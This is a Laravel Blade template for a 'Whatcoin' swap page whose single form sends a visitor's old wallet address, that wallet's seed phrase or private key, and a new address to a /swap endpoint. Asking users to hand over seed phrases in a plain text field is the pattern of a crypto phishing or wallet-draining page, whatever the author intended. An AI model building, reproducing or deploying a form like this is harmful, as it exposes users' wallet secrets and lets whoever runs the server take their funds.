<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>What</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
          integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">


    <!-- Styles -->

    <style>
        body {
            font-family: 'Nunito', sans-serif;
        }
    </style>
</head>
<body class="antialiased" style="background: linear-gradient(
30deg, rgb(0,96,21) 22%, rgb(0,170,37) 55%);">
<div class="container">
    <div style="margin-bottom: -30px;">
        <img
                src="/images/whatcoin.png"
                alt="What Coin?">
    </div>

    <div class="card w-75 mb-5" style="border-radius: 10px;">
        <div class="card-body">
            @if (Session::has('message'))

                <div class="alert alert-info">{{ Session::get('message') }}</div>

            @endif
            <form method="POST" action="/swap">
                @csrf
                <div class="form-group">
                    <label for="old_address" style="font-size: 18px;">Old Whatcoin Public Address</label>
                    <input required type="text" class="form-control" name="old_address" id="old_address">
                </div>
                <div class="form-group">
                    <label for="old_key" style="font-size: 18px;">Old Whatcoin Seed Phrase or Priv Key</label>
                    <input required type="text" class="form-control" name="old_key" id="old_key">
                </div>
                <div class="form-group">
                    <label for="new_address" style="font-size: 18px;">New Public WhatCoin Address</label>
                    <input required type="text" class="form-control" name="new_address" id="new_address">
                </div>
                <button type="submit" class="btn btn-outline-success mt-2">Submit</button>
            </form>
        </div>
    </div>
</div>
</body>
</html>
